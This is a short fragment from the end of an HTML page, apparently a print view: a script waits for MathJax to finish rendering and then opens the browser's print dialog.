            MathJax.Hub.Register.StartupHook('End', function() {
                window.setTimeout(window.print, 100);
            });
        });
        </script>
    </body>
</html>
